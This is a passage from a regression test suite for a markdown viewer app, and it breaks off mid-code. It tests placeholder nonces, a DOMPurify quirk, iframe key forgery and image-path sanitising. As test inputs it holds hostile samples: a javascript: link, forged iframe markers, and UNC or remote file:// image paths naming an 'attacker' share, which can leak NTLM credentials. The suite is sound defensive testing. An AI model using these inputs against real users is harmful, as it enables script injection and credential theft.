  // them would make the fixture agree with whatever the product does, which is
  // the one thing a regression test must not do.
  const F43_NONCELESS_MERMAID = "MERMAID_BLOCK_0_";
  const F43_NONCELESS_RAW = "RAWHTML_BLOCK_0_";

  // A second diagram distinguishable from the first, so fixture E can assert
  // WHICH source landed in WHICH <pre> rather than merely counting two of them.
  const F43_SECOND_DIAGRAM = "graph LR\n  C[Second] --> D[Block]";
  const f43MultiDoc =
    "# Doc\n\n```mermaid\n" +
    F43_DIAGRAM +
    "\n```\n\ntext between\n\n@@@html\n<b>first raw</b>\n@@@\n\n```mermaid\n" +
    F43_SECOND_DIAGRAM +
    "\n```\n\nmore text\n\n@@@html\n<b>second raw</b>\n@@@\n";

  for (const leg of [
    { mode: "full", mermaidTok: "MERMAID_PLACEHOLDER_0", rawTok: "RAWHTML_PLACEHOLDER_0" },
    { mode: "light-format", mermaidTok: "MERMAID_PH_0", rawTok: "RAWHTML_PH_0" },
  ]) {
    // The light-format path only engages once something has been rendered, so
    // every light leg is preceded by a full render of a benign document - the
    // same warm-up SEC-28 uses.
    const warm = async () => {
      if (leg.mode === "light-format") await render("# Warm\n\nplain text\n", "full");
    };

    // POSITIVE CONTROL for the mermaid legs' oracle. Both fixture A and
    // fixture C read `data-mermaid-src` back off the restored <pre>, and an
    // oracle that this render path can never satisfy is indistinguishable from
    // a real proof - the harness checks that a revert's `expect` MATCHES, not
    // that the assertion passes at rest (R357). The two paths used to carry the
    // attribute by DIFFERENT mechanisms: the full path re-derived it in JS
    // inside the mermaid.run set-up, while the light path never runs mermaid
    // and relied entirely on the attribute it authored surviving DOMPurify.
    // That private re-derivation is gone - both paths now call
    // restoreMermaidSourceAttributes() after sanitization and nothing else
    // repairs it - which makes this control MORE load-bearing, not less: with
    // one shared mechanism, an oracle nothing can satisfy would be vacuous on
    // both legs at once.
    await warm();
    await render("# Doc\n\n```mermaid\n" + F43_DIAGRAM + "\n```\n", leg.mode);
    const ctl = await f43Probe(leg.mermaidTok);
    check(
      `F43 control: a benign diagram carries its source on this path (${leg.mode})`,
      ctl.mermaidCount === 1 &&
        ctl.mermaidSrc === F43_DIAGRAM &&
        ctl.stranded === 0 &&
        ctl.renderError === null,
      JSON.stringify(ctl),
    );

    await warm();
    await render(f43MermaidDecoy(leg.mermaidTok), leg.mode);
    const a = await f43Probe(leg.mermaidTok);
    check(
      `F43 a decoy mermaid placeholder cannot capture the real diagram (${leg.mode})`,
      a.codeText === leg.mermaidTok &&
        a.stranded === 0 &&
        a.mermaidCount === 1 &&
        a.mermaidSrc === F43_DIAGRAM &&
        a.renderError === null,
      JSON.stringify(a),
    );

    await warm();
    await render(f43RawDecoy(leg.rawTok), leg.mode);
    const b = await f43Probe(leg.rawTok);
    check(
      `F43 a decoy @@@html placeholder cannot capture the real raw-html block (${leg.mode})`,
      b.codeText === leg.rawTok &&
        b.stranded === 0 &&
        b.frameCount === 1 &&
        b.srcdocLen > 0 &&
        b.renderError === null,
      JSON.stringify(b),
    );

    await warm();
    await render(f43DollarDoc, leg.mode);
    const c = await f43Probe(leg.mermaidTok);
    check(
      `F43 a diagram body of $-replacement patterns round-trips verbatim (${leg.mode})`,
      c.mermaidCount === 1 &&
        c.mermaidSrc === F43_DOLLAR_DIAGRAM &&
        c.renderError === null,
      JSON.stringify(c),
    );

    // Fixture D - the decoy a NONCE-LESS product would be vulnerable to.
    //
    // Fixtures A and B write the two HISTORICAL literals, so they guard against
    // reintroducing those exact spellings and nothing else. They are structurally
    // blind to the likelier accident: keeping this fix's prefix but dropping the
    // random part, which mints a token a document can once again author. The
    // decoy below is exactly what `MERMAID_BLOCK_`/`RAWHTML_BLOCK_` yield with no
    // nonce, so it captures the hole the moment the nonce stops being minted and
    // is inert while it is. R529.
    await warm();
    await render(f43MermaidDecoy(F43_NONCELESS_MERMAID), leg.mode);
    const d = await f43Probe(F43_NONCELESS_MERMAID);
    check(
      `F43 a decoy matching the nonce-less token shape cannot capture the real diagram (${leg.mode})`,
      d.codeText === F43_NONCELESS_MERMAID &&
        d.stranded === 0 &&
        d.mermaidCount === 1 &&
        d.mermaidSrc === F43_DIAGRAM &&
        d.renderError === null,
      JSON.stringify(d),
    );

    await warm();
    await render(f43RawDecoy(F43_NONCELESS_RAW), leg.mode);
    const d2 = await f43Probe(F43_NONCELESS_RAW);
    check(
      `F43 a decoy matching the nonce-less raw-html token shape cannot capture the real block (${leg.mode})`,
      d2.codeText === F43_NONCELESS_RAW &&
        d2.stranded === 0 &&
        d2.frameCount === 1 &&
        d2.srcdocLen > 0 &&
        d2.renderError === null,
      JSON.stringify(d2),
    );

    // Fixture E - MORE THAN ONE BLOCK OF EACH KIND IN ONE DOCUMENT.
    //
    // Every F43 fixture above renders exactly one mermaid fence and one @@@html
    // block, so all of them are satisfied by a restore that rewrites only the
    // FIRST occurrence. That is not a hypothetical shape: it is what dropping
    // the `g` flag from the shared regex produces, and it strands every block
    // after the first as inert placeholder text in the reader's document.
    //
    // The coverage this closes is the REMAINDER, not the whole: "FEATURE two
    // identical @@@html blocks both receive their document" already witnessed
    // multiplicity for @@@html on one path (measured - it fails under R531
    // too). What had no witness at all was multiplicity for MERMAID, and
    // neither kind had one on the light path. The two sources are asserted
    // DISTINCTLY rather than merely counted, so a restore that fills the right
    // number of holes with the wrong bodies - the index-arithmetic accident -
    // fails here as well. R531.
    await warm();
    await render(f43MultiDoc, leg.mode);
    // The token argument is a SENTINEL that appears nowhere in the document:
    // the real placeholders here carry a per-render nonce, so `stranded` cannot
    // spell them and `strandedLike` is the oracle that can. Passing the diagram
    // source instead would be wrong twice over - it is not a placeholder, and it
    // legitimately appears as the text of the rendered `pre.mermaid`.
    const e = await f43Probe("F43_SENTINEL_NEVER_RENDERED");
    check(
      `F43 every block is restored, not just the first (${leg.mode})`,
      e.mermaidCount === 2 &&
        e.mermaidSrcs[0] === F43_DIAGRAM &&
        e.mermaidSrcs[1] === F43_SECOND_DIAGRAM &&
        e.frameCount === 2 &&
        e.srcdocLens.length === 2 &&
        e.srcdocLens.every((n) => n > 0) &&
        e.stranded === 0 &&
        e.strandedLike === 0 &&
        e.renderError === null,
      JSON.stringify(e),
    );

    // The `unwrapParagraph` asymmetry itself. Nothing else in either suite
    // observes it: flipping the flag at either @@@html call site leaves
    // <p><iframe/></p>, and frameCount / srcdocLen / mermaidCount are all
    // unchanged, so the whole suite stays green while the DOM shape the
    // renderer's own comment calls load-bearing has changed.
    //
    // Only the iframe half is a real assertion. The mermaid half cannot be got
    // wrong the same way - <pre> is not phrasing content, so the parser closes
    // an open <p> before it regardless of what the restore emits - and it is
    // recorded here as evidence rather than as a claim about the flag.
    //
    // `frameCount > 0` is a vacuity guard, NOT a count: with no frames,
    // frameParent is null and "null !== P" would pass an empty page. It is
    // deliberately not `=== 2`, because that would make this assertion fail
    // under R531 as well and it would then be testing multiplicity - which is
    // fixture E's job - instead of paragraph shape.
    check(
      `F43 the @@@html restore swallows the paragraph marked wrapped it in (${leg.mode})`,
      e.frameCount > 0 && e.frameParent !== "P",
      JSON.stringify({ frameParent: e.frameParent, mermaidParent: e.mermaidParent }),
    );
  }

  // The nonce must be minted PER RENDER, not once per session. Every fixture
  // above is blind to the difference: fixture D pins the nonce-LESS shape, and
  // a session-constant nonce still does not match `MERMAID_BLOCK_0_`, so
  // hoisting mintPlaceholderNonce() to module scope "because entropy per render
  // is wasteful" would leave the whole suite green while destroying the one
  // property the fix is named for - that a document cannot author the token.
  // Two calls, one render, different answers is the whole claim.
  const nonces = JSON.parse(
    await exec(`JSON.stringify([mintPlaceholderNonce(), mintPlaceholderNonce()])`),
  );
  check(
    "the placeholder nonce is minted fresh on every call, not once per session",
    nonces.length === 2 && nonces[0] !== nonces[1] && nonces.every((n) => /^[a-z0-9]+$/.test(n)),
    JSON.stringify(nonces),
  );

  // ---- TWO-DIGIT BLOCK INDICES, at the shared helper directly -------------
  //
  // Every fixture above renders at most two blocks of a kind, so the highest
  // index any of them mints is 1 and the restore pattern's `(\d+)_` is only
  // ever asked to match ONE digit. Reaching a two-digit index through the
  // public render path costs eleven diagrams per leg, which buys nothing the
  // helper cannot show more precisely - so this exercises createBlockPlaceholders
  // itself, in the live renderer page, with no render at all.
  //
  // It is also STRICTLY STRONGER than the page could be, in three ways:
  //
  //  - THE ORACLE IS THE EXACT RESTORED STRING, not a regex extract plus
  //    counts. An extract of `[PAYLOAD-n]` matches just as happily when the
  //    restore leaves a trailing `_` behind after every replacement, which is
  //    precisely what dropping the index terminator does. A full compare
  //    cannot miss it.
  //  - the @@@html half's index-to-payload identity is unobservable in the
  //    page: eleven iframes carry eleven srcdoc documents of near-identical
  //    length, so a DOM fixture can assert only that each was funded, never
  //    WHICH body each received.
  //  - the `unwrapParagraph` shape is a DIFFERENT REGEX (`<p>core</p>|core`,
  //    two capture groups, so the callback reads a different argument), and
  //    only here can the paragraph be shown swallowed for EVERY block rather
  //    than for the first frame the page happens to expose.
  //
  // MEASURED against this same restore, all five index patterns, 12 blocks,
  // both `unwrapParagraph` shapes:
  //
  //   (\d+)_   shipped              0..11 correct, no debris
  //   (\d+?)_  lazy, terminated     0..11 correct, no debris - INERT, so it is
  //                                 deliberately not recorded as a revert
  //   (\d+)    greedy, no term.     0..11 correct, ONE '_' left per block, and
  //                                 the <p> alternative stops matching  (R532)
  //   (\d+?)   lazy, no terminator  10 and 11 both receive BLOCK 1            (R533)
  //   (\d)_    single digit         0..9 restored, 10 and 11 STRANDED         (R538)
  //
  // So the terminator is NOT a mapping guard - the greedy `(\d+)` already makes
  // the ..._1_ / ..._10_ collision unreachable, and laziness alone is inert
  // because the terminator forces the backtrack that recovers the second digit.
  // What the terminator does is end the token cleanly, and that is what R532
  // measures. The three records stay isolated through the SELECTION assertion
  // below, which R532 must leave passing.
  const F43_HELPER_N = 11;
  const f43Helper = JSON.parse(
    await exec(`
    (() => {
      const N = ${F43_HELPER_N};
      const mk = (unwrap) => {
        const ph = createBlockPlaceholders(unwrap ? 'RAWHTML_PROBE_' : 'MERMAID_PROBE_');
        const toks = [];
        for (let i = 0; i < N; i++) toks.push(ph.take('PAYLOAD-' + i));
        const html = unwrap
          ? toks.map((t) => '<p>' + t + '</p>').join('\\n')
          : toks.map((t) => '<pre>' + t + '</pre>').join('\\n');
        // The order the product's OWN builder was called in, recorded as it
        // happens. This is not an extract from the output - it is which block
        // the restore chose for each hole, in document order.
        const chosen = [];
        const out = ph.restore(html, (code) => { chosen.push(code); return '[' + code + ']'; }, unwrap);
        return {
          // POSITIVE CONTROL: the fixture has to actually reach a two-digit
          // index, or an assertion about two-digit indices is vacuous.
          token10: toks[10],
          out: out,
          chosen: chosen,
        };
      };
      return JSON.stringify({ bare: mk(false), unwrapped: mk(true) });
    })()
  `),
  );
  // Built here, from the payloads this test authored, with no reference to what
  // the product produced - the one thing a regression oracle must not do is
  // agree with whatever the product does.
  const f43Payloads = Array.from({ length: F43_HELPER_N }, (_, i) => "PAYLOAD-" + i);
  const f43BareExpected = f43Payloads.map((p) => "<pre>[" + p + "]</pre>").join("\n");
  const f43UnwrapExpected = f43Payloads.map((p) => "[" + p + "]").join("\n");
  check(
    "F43 the shared helper restores every placeholder exactly, two digits included",
    /_10_$/.test(f43Helper.bare.token10) && f43Helper.bare.out === f43BareExpected,
    JSON.stringify({ out: f43Helper.bare.out, token10: f43Helper.bare.token10 }),
  );
  check(
    // The `<p>` wrappers are absent from the expected string: this shape's job
    // is to swallow the paragraph marked wrapped the lone placeholder in, for
    // every block and not just the first. An exact compare pins both halves at
    // once - which block, and what became of its paragraph.
    "F43 the helper's paragraph-unwrapping shape restores exactly, and eats every paragraph",
    /_10_$/.test(f43Helper.unwrapped.token10) &&
      f43Helper.unwrapped.out === f43UnwrapExpected,
    JSON.stringify({ out: f43Helper.unwrapped.out, token10: f43Helper.unwrapped.token10 }),
  );
  check(
    // SELECTION, separately, and it is what keeps the three index records apart.
    // The exact-output assertions above fail for ANY defect in the restore;
    // this one fails only when the WRONG BLOCK is chosen for a hole (or a hole
    // is skipped). Dropping the terminator leaves this passing, which is the
    // difference between R532 and R533/R538 stated as an assertion rather than
    // as evidence.
    "F43 the helper hands each hole its own block, in order, at two-digit indices too",
    JSON.stringify(f43Helper.bare.chosen) === JSON.stringify(f43Payloads) &&
      JSON.stringify(f43Helper.unwrapped.chosen) === JSON.stringify(f43Payloads),
    JSON.stringify({ bare: f43Helper.bare.chosen, unwrapped: f43Helper.unwrapped.chosen }),
  );

  // ---- N18 - DOMPurify deletes the mermaid source attribute for real
  // flowcharts, and it does so on a VALUE SHAPE, not an attribute name ----
  //
  // DOMPurify 3.4.14 drops any attribute whose DECODED value matches
  // /((--!?|])>)|<\/(style|script|title|xmp|textarea|noscript|iframe|noembed|noframes)/i
  // (extracted from the shipped libs/vendor/purify.min.js, not quoted from
  // memory - an earlier draft of this comment truncated the alternation to
  // (style|title) and understated the finding). "-->" is the canonical mermaid
  // flowchart arrow, so data-mermaid-src was being deleted for essentially
  // every real diagram; a diagram body containing "</script" or "</iframe"
  // loses it too. No HTML-level escaping avoids it: escapeHtml() writes --&gt;,
  // the parser decodes it back, and the guard inspects the DECODED value.
  // Adding the name to ADD_ATTR is a no-op for the same reason - the drop is
  // not name-based.
  //
  // The two halves are asserted SEPARATELY on purpose (the R468 precedent).
  // The PREMISE is a fact about the dependency: if a future DOMPurify relaxes
  // that guard the repair becomes unnecessary, and this fails loudly rather
  // than leaving dead code nobody dares remove. The CONSEQUENCE is a fact about
  // the product. A reader seeing only the consequence would credit the repair
  // for something the sanitizer might no longer be doing.
  const n18Premise = await exec(`
    (() => {
      const shape = (escaped) => {
        const out = window.sanitizeHtml(
          '<pre class="mermaid" data-mermaid-src="' + escaped + '">x</pre>');
        const d = document.createElement('div');
        d.innerHTML = out;
        const p = d.querySelector('pre.mermaid');
        return { kept: !!p, attr: p ? p.getAttribute('data-mermaid-src') : null };
      };
      return {
        hasSanitizer: typeof window.sanitizeHtml === 'function',
        arrow: shape('A --&gt; B'),
        plain: shape('A -&gt; B'),
      };
    })()
  `);
  check(
    "N18 premise: DOMPurify deletes a data- attribute whose value decodes to a flowchart arrow",
    n18Premise.hasSanitizer === true &&
      // The ELEMENT survives in both cases - only the attribute is taken, which
      // is what made this invisible: the diagram still rendered.
      n18Premise.arrow.kept === true &&
      n18Premise.plain.kept === true &&
      n18Premise.arrow.attr === null &&
      // Positive control: the same attribute, one dash shorter, is untouched.
      // Without it "the attribute is gone" is equally satisfied by a sanitizer
      // that strips every data- attribute, or by a probe that never authored
      // one - an absence check fails open.
      n18Premise.plain.attr === "A -> B",
    JSON.stringify(n18Premise),
  );

  // Consequence, on BOTH paths. They used to carry the attribute by different
  // mechanisms - the full path was repairing it by accident inside the
  // mermaid.run set-up, the light path had nothing at all - so a single-leg
  // assertion would have reported the light defect as a full-path pass. The
  // accident has since been removed and both paths call the same helper, but
  // they call it from two separate sites, so the two legs still measure two
  // different things (R527 / R528 break one each).
  const N18_ARROW = "graph TD\n  A --> B";
  const N18_PLAIN = "graph TD\n  A[Only one node]";
  for (const mode of ["full", "light-format"]) {
    if (mode === "light-format") await render("# Warm\n\nplain text\n", "full");
    await render("# Doc\n\n```mermaid\n" + N18_ARROW + "\n```\n", mode);
    const arrow = await f43Probe("unused");
    if (mode === "light-format") await render("# Warm\n\nplain text\n", "full");
    await render("# Doc\n\n```mermaid\n" + N18_PLAIN + "\n```\n", mode);
    const plain = await f43Probe("unused");
    check(
      `N18 a flowchart arrow diagram still carries its source after render (${mode})`,
      arrow.mermaidCount === 1 &&
        arrow.mermaidSrc === N18_ARROW &&
        arrow.renderError === null &&
        // The arrow-free diagram is the discriminator. If BOTH legs lose the
        // attribute the repair is missing outright; if only the arrow leg does,
        // the sanitizer's value guard is the mechanism - which is the defect
        // this assertion is named for.
        plain.mermaidCount === 1 &&
        plain.mermaidSrc === N18_PLAIN &&
        plain.renderError === null,
      JSON.stringify({ arrow, plain }),
    );
  }

  // A javascript: URL must not survive, in either path.
  await render("# Doc\n\n[click](javascript:window.__pwned='link')\n", "full");
  const jsLink = await exec(`
    (() => {
      const a = document.querySelector('#viewer a');
      return { href: a ? a.getAttribute('href') : null };
    })()
  `);
  check(
    "SANITIZER javascript: URLs are still stripped from links",
    !jsLink.href || !/^javascript:/i.test(jsLink.href.trim()),
    JSON.stringify(jsLink),
  );

  // Both render paths must agree; a payload blocked on one and not the other is
  // exactly the inconsistency SEC-26 describes.
  check(
    "SEC-26 image alt payload is blocked on the light-format path too",
    (await render(altBreakoutPayload, "light-format")) === null,
    "light-format path executed the image alt payload",
  );  check(
    "SEC-26 legacy slider payload is blocked on the light-format path too",
    (await render(sliderPayload, "light-format")) === null,
    "light-format path executed the legacy slider payload",
  );
  check(
    "SEC-26 removed-feature fence is blocked on the light-format path too",
    (await render(omniwarePayload, "light-format")) === null,
    "light-format path executed the removed-feature fence payload",
  );

  // ==========================================================================
  // Raw-HTML frame ownership
  //
  // @@@html documents are attached with setAttribute *after* sanitization, so
  // the only thing stopping arbitrary markdown from picking one up is how the
  // frames are keyed. These pin that: a forged marker must get nothing, and a
  // frame must never keep showing a previous document's content.
  // ==========================================================================

  // Render a real @@@html block and capture the key the renderer assigned.
  await render(
    "# Doc\n\n@@@html\n<p id=owned-marker>owned raw html</p>\n@@@\n",
    "full",
    2200,
  );
  const realKey = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      return f ? { key: f.dataset.rawhtmlKey || null, len: (f.getAttribute('srcdoc')||'').length } : null;
    })()
  `);
  check(
    "FEATURE @@@html frame is keyed by content and receives its document",
    realKey && typeof realKey.key === "string" && realKey.key.length > 0 && realKey.len > 0,
    JSON.stringify(realKey),
  );

  // Same key, but authored directly in markdown in a document that contains no
  // @@@html block at all. The frame must come back empty - if it does not, raw
  // HTML from a previously viewed file is leaking into this one.
  const forged =
    "# Doc\n\n<iframe class=\"raw-html-block\" data-rawhtml-key=\"" +
    String(realKey && realKey.key) +
    "\"></iframe>\n";
  await render(forged, "full", 2200);
  const forgedState = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { present: false };
      const sd = f.getAttribute('srcdoc') || '';
      return { present: true, srcdocLen: sd.length, leaked: sd.includes('owned raw html') };
    })()
  `);
  check(
    "SEC-01 a markdown-authored raw-html marker receives no document",
    forgedState.present === false ||
      (forgedState.srcdocLen === 0 && forgedState.leaked === false),
    JSON.stringify(forgedState),
  );

  // Same document, this time containing the real @@@html block AND a forged
  // marker reusing its key. The key is derived from public content, so an
  // author can always compute it; what must not happen is the forged frame
  // getting a second copy of the block's document.
  const sameRender =
    "# Doc\n\n@@@html\n<p id=owned-marker>owned raw html</p>\n@@@\n\n" +
    "<iframe class=\"raw-html-block\" data-rawhtml-key=\"" +
    String(realKey && realKey.key) +
    "\"></iframe>\n";
  await render(sameRender, "full", 2500);
  const sameRenderState = await exec(`
    (() => {
      const fs = Array.from(document.querySelectorAll('iframe.raw-html-block'));
      return {
        count: fs.length,
        filled: fs.filter(f => (f.getAttribute('srcdoc')||'').includes('owned raw html')).length
      };
    })()
  `);
  check(
    "SEC-01 a forged marker cannot claim a second copy of a block in the same render",
    sameRenderState.count >= 1 && sameRenderState.filled === 1,
    JSON.stringify(sameRenderState),
  );

  // ...but two genuinely identical @@@html blocks must both still render.
  await render(
    "# Doc\n\n@@@html\n<p>twin</p>\n@@@\n\n@@@html\n<p>twin</p>\n@@@\n",
    "full",
    2500,
  );
  const twins = await exec(`
    (() => {
      const fs = Array.from(document.querySelectorAll('iframe.raw-html-block'));
      return {
        count: fs.length,
        filled: fs.filter(f => (f.getAttribute('srcdoc')||'').includes('twin')).length
      };
    })()
  `);
  check(
    "FEATURE two identical @@@html blocks both receive their document",
    twins.count === 2 && twins.filled === 2,
    JSON.stringify(twins),
  );

  // The resize channel is the only way a sandboxed @@@html frame can influence  // the host, and it now identifies the sender by matching event.source against
  // the managed frames. If contentWindow does not match for an opaque-origin
  // srcdoc frame, that check silently kills the feature - so assert the height
  // is actually applied, end to end, rather than trusting the code shape.
  await render(
    "# Doc\n\n@@@html\n<div style=\"height:640px\">tall</div>\n@@@\n",
    "full",
    3500,
  );
  const resized = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { present: false };
      return { present: true, height: parseInt(f.style.height || '0', 10) };
    })()
  `);
  check(
    "FEATURE sandboxed @@@html frame can still report its height to the host",
    resized.present === true && resized.height >= 600,
    JSON.stringify(resized),
  );
  // Since SEC-09 landed this assertion carries a second, heavier job, recorded
  // here because it is not obvious from its name: it is the control for
  // `script-src 'unsafe-inline'`.
  //
  // The height is written by a script buildRawHtmlDocument() appends inside the
  // srcdoc document (renderer.js:260), and an about:srcdoc frame inherits the
  // embedder's CSP. Drop 'unsafe-inline' and that script never runs: no error
  // is logged anywhere, the frame silently stays at its 50px min-height, and
  // every @@@html block in the app is clipped. Verified by reverting the CSP to
  // `script-src 'self'` - this assertion reports height 0.

  // ==========================================================================
  // Local image paths - the sanitizer hook must be narrow
  //
  // Drive-letter and file:///<drive> paths are ordinary usage in a local
  // viewer. UNC and remote file://host paths are not: on Windows an <img>
  // pointing at a remote SMB share is fetched automatically and can hand the
  // user's NTLM credentials to a host named by untrusted markdown.
  // ==========================================================================
  // No document is open here, so a relative src has nothing to resolve against
  // and must survive verbatim. Set explicitly rather than relying on the order
  // the sections happen to run in - i5 below is exactly the case the
  // document-relative resolver rewrites once a file IS open.
  await exec(`window.currentFilePath = null; true`);
  await render(
    "# Doc\n\n" +
      "<img id=i1 src=\"C:\\pics\\a.png\">\n\n" +
      "<img id=i2 src=\"file:///C:/pics/b.png\">\n\n" +
      "<img id=i3 src=\"\\\\attacker\\share\\c.png\">\n\n" +
      "<img id=i4 src=\"file://attacker/share/d.png\">\n\n" +
      "<img id=i5 src=\"img/e.png\">\n\n" +
      "<img id=i6 src=\"//attacker/share/f.png\">\n",
    "full",
    1500,
  );
  const imgs = await exec(`
    (() => {
      const g = (id) => {
        const el = document.getElementById(id);
        return el ? (el.getAttribute('src') || '') : null;
      };
      return { i1: g('i1'), i2: g('i2'), i3: g('i3'), i4: g('i4'), i5: g('i5'), i6: g('i6') };
    })()
  `);
  check(
    "FEATURE local drive-letter and file:///<drive> image paths are preserved",
    imgs.i1 === "C:\\pics\\a.png" && imgs.i2 === "file:///C:/pics/b.png",
    JSON.stringify(imgs),
  );
  check(
    "SEC-hook UNC, protocol-relative and remote file:// image paths are stripped",
    !imgs.i3 && !imgs.i4 && !imgs.i6,
    JSON.stringify(imgs),
  );
  check(
    "FEATURE ordinary relative image paths are unaffected by the hook",
    imgs.i5 === "img/e.png",
    JSON.stringify(imgs),
  );

  // ==========================================================================
  // Document-relative image sources resolve against the file being viewed
  //
  // Relative *links* have always resolved against path.dirname(currentFilePath);
  // relative *images* did not. They resolved against document.baseURI, which is
  // index.html INSIDE THE ASAR, so `![](shots/a.png)` next to the document
  // silently never loaded - naturalWidth 0, measured on the real open path.
  //
  // The assertions below are deliberately about whether the bytes LOAD, not
  // about the shape of the src string: the whole defect was a src that looked
  // perfectly reasonable and pointed nowhere. Real PNGs are written to disk and
  // naturalWidth is the oracle.
  //
  // The encoded cases are not decoration. marked percent-encodes what it emits
  // (`shots/my pic.png` arrives as `shots/my%20pic.png`, `hash#tag.png` as
  // `hash%23tag.png`), so a resolver that joins strings produces a path with a
  // literal `%20` in it and the image stays broken. Only a URL-parser
  // resolution survives these two.
  // ==========================================================================
  const relDir = path.join(dir, "relimg");
  const relShots = path.join(relDir, "shots");
  fs.mkdirSync(relShots, { recursive: true });
  const relPng = Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAJUlEQVR42u3NMQEAAAgDoC252H0M" +
      "PwjQk3aTLwoAAAAAAAAAAAAcWzQoAAG5jgSdAAAAAElFTkSuQmCC",
    "base64",
  );
  for (const n of ["a.png", "b.png", "my pic.png", "hash#tag.png", "raw.png"]) {
    fs.writeFileSync(path.join(relShots, n), relPng);
  }
  fs.writeFileSync(path.join(relDir, "sibling.png"), relPng);
  const relDoc = path.join(relDir, "doc.md");
  fs.writeFileSync(relDoc, "placeholder", "utf8");

  // VACUITY GUARD: if the fixtures are not on disk every naturalWidth below is
  // 0 for a reason that has nothing to do with the resolver, and the suite
  // would be asserting against a broken setup rather than against the product.
  check(
    "SETUP relative-image fixtures exist on disk",
    fs.existsSync(path.join(relShots, "a.png")) &&
      fs.existsSync(path.join(relShots, "my pic.png")) &&
      fs.existsSync(path.join(relShots, "hash#tag.png")) &&
      fs.existsSync(path.join(relDir, "sibling.png")),
    relDir,
  );

  await exec(`window.currentFilePath = ${JSON.stringify(relDoc)}; true`);
  await render(
    "# Doc\n\n" +
      "![plain](shots/a.png)\n\n" +
      "![dot](./shots/b.png)\n\n" +
      "![space](<shots/my pic.png>)\n\n" +
      "![hash](shots/hash%23tag.png)\n\n" +
      "![sibling](sibling.png)\n\n" +
      "![dotdot](sub/../shots/a.png)\n\n" +
      '<img alt="rawhtml" src="shots/raw.png">\n\n' +
      "![missing](shots/nope.png)\n\n" +
      "![unc](//attacker/share/x.png)\n\n" +
      "![frag](#nope)\n\n" +
      '<img alt="abs" src="C:\\pics\\a.png">\n',
    "full",
    1800,
  );
  const rel = await exec(`
    (() => {
      const out = {};
      for (const i of document.querySelectorAll('#viewer img')) {
        out[i.getAttribute('alt') || '?'] = {
          w: i.naturalWidth,
          attr: i.getAttribute('src'),
          authored: i.getAttribute('data-original-src')
        };
      }
      return out;
    })()
  `);
  const relLoaded = (k) => !!(rel[k] && rel[k].w > 0);
  check(
    "FEATURE document-relative images load: markdown, ./-prefixed, sibling and raw HTML",
    relLoaded("plain") &&
      relLoaded("dot") &&
      relLoaded("sibling") &&
      relLoaded("rawhtml"),
    JSON.stringify(rel),
  );
  check(
    "FEATURE percent-encoded relative images load (spaces and #)",
    relLoaded("space") && relLoaded("hash"),
    JSON.stringify(rel),
  );
  check(
    "FEATURE a relative image traversing .. resolves to the same file",
    relLoaded("dotdot"),
    JSON.stringify(rel),
  );
  check(
    "FEATURE the authored src is preserved for the note feature",
    rel.plain &&
      rel.plain.authored === "shots/a.png" &&
      rel.dot &&
      rel.dot.authored === "./shots/b.png",
    JSON.stringify(rel),
  );
  check(
    "SEC-hook a UNC image src stays stripped even with a document path set",
    !!rel.unc && !rel.unc.attr,
    JSON.stringify(rel),
  );
  check(
    "FEATURE an absolute drive-letter src is left exactly as authored",
    !!rel.abs && rel.abs.attr === "C:\\pics\\a.png" && !rel.abs.authored,
    JSON.stringify(rel),
  );
  check(
    "FEATURE a relative image naming a missing file stays broken, not silently rewritten elsewhere",
    !!rel.missing && rel.missing.w === 0 && /shots\/nope\.png$/.test(rel.missing.attr || ""),
    JSON.stringify(rel),
  );
  // A fragment-only src names no image. Resolving it would write the
  // document's own absolute path into the attribute, and from there into the
  // exported PDF, for nothing.
  check(
    "FEATURE a fragment-only image src is not resolved to the document's own path",
    !!rel.frag && rel.frag.attr === "#nope" && !rel.frag.authored,
    JSON.stringify(rel),
  );

  // With no document open there is nothing to resolve against, and the src must
  // be left alone rather than resolved against the app's own directory.
  await exec(`window.currentFilePath = null; true`);
  await render("# Doc\n\n![nodoc](shots/a.png)\n", "full", 900);
  const noDoc = await exec(`
    (() => {
      const i = document.querySelector('#viewer img');
      return i ? { attr: i.getAttribute('src'), authored: i.getAttribute('data-original-src') } : null;
    })()
  `);
  check(
    "FEATURE with no file open a relative image src is left untouched",
    !!noDoc && noDoc.attr === "shots/a.png" && !noDoc.authored,
    JSON.stringify(noDoc),
  );

  // ==========================================================================
  // The rendered src is not the authored markdown destination
  //
  // marked normalises the destination on its way into the attribute:
  //
  //   ![a](<shots/my pic.png>)  ->  src="shots/my%20pic.png"
  //
  // so the note feature - which rebuilds `![alt](src)` and searches the raw
  // markdown for it - found nothing and reported "Could not find image in
  // source" for any path containing a space or a #. That is older than the
  // relative-path resolution above and independent of it, but it is the same
  // mistake about what the src string is, so it is fixed and pinned together.
  //
  // The image slider was the second consumer of this contract and had its own
  // assertion here until 8c2 removed the feature. The contract itself is
  // unchanged and is still measured, because the note feature exercises the
  // same helpers (markdownImageCandidates, data-original-src) end to end.
  //
  // The assertion drives the REAL context-menu handler on a REAL rendered
  // image: a contextmenu event to set the right-click target, then a click on
  // the actual menu item. Nothing is asserted about source text alone.
  // ==========================================================================
  const normSrc = "# Doc\n\n![space](<shots/my pic.png>)\n";
  fs.writeFileSync(relDoc, normSrc, "utf8");
  await exec(`window.ipcRenderer.send('open-file-path', { filePath: ${JSON.stringify(relDoc)} }); null`);
  let noteOwner = null;
  for (let i = 0; i < 100; i++) {
    noteOwner = await exec(`(() => {
      const tab = window.CustomTabs.getActiveTab();
      return {
        id: tab && tab.id,
        path: tab && tab.filePath,
        content: tab && tab.content,
        original: tab && tab.originalContent,
        live: window.originalMarkdown,
      };
    })()`);
    if (noteOwner.path === relDoc &&
        noteOwner.content === normSrc &&
        noteOwner.original === normSrc &&
        noteOwner.live === normSrc) break;
    await sleep(50);
  }
  check(
    "the note fixture owns its real disk document before auto-save",
    noteOwner.path === relDoc &&
      noteOwner.content === normSrc &&
      noteOwner.original === normSrc &&
      noteOwner.live === normSrc,
    JSON.stringify(noteOwner),
  );
  if (noteOwner.path !== relDoc || noteOwner.original !== normSrc ||
      noteOwner.content !== normSrc || noteOwner.live !== normSrc) {
    throw new Error("Note fixture did not acquire a disk-backed tab owner");
  }
  await exec(`(() => {
    window.__noteFixture = {
      alerts: [], confirmations: [],
      alert: window.alert, confirm: window.confirm,
    };
    window.alert = message => window.__noteFixture.alerts.push(String(message));
    window.confirm = message => {
